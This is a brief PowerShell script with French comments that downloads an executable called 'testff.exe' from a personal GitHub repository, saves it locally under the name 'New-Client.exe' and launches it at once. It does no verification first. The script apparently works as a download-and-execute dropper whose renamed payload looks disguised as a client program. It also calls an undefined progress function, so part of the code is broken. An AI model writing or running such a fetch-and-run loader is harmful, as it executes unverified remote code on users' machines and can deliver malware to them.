# Définir l'URL du fichier à télécharger
$url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"

# Définir le chemin local où le fichier sera enregistré
$localPath = "$PWD\New-Client.exe"

# Télécharger le fichier avec une barre de chargement personnalisée
$webClient = New-Object System.Net.WebClient
$totalBytes = [System.Net.WebRequest]::Create($url).GetResponse().ContentLength
$currentBytes = 0

# Définir un gestionnaire d'événements pour le téléchargement
Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -Action {
    param($sender, $e)
    $currentBytes = $e.BytesReceived
    Show-CustomProgress -total $totalBytes -current $currentBytes
}

# Télécharger le fichier
$webClient.DownloadFileAsync($url, $localPath)

# Attendre la fin du téléchargement
while ($webClient.IsBusy) {
    Start-Sleep -Milliseconds 100
}

# Afficher un retour à la ligne final
Write-Host ""

# Vérifier si le fichier a été téléchargé avec succès
if (Test-Path $localPath) {
    Write-Output "Le fichier a été téléchargé avec succès."

    # Lancer le fichier exécutable
    Start-Process -FilePath $localPath
} else {
    Write-Output "Erreur lors du téléchargement du fichier."
}
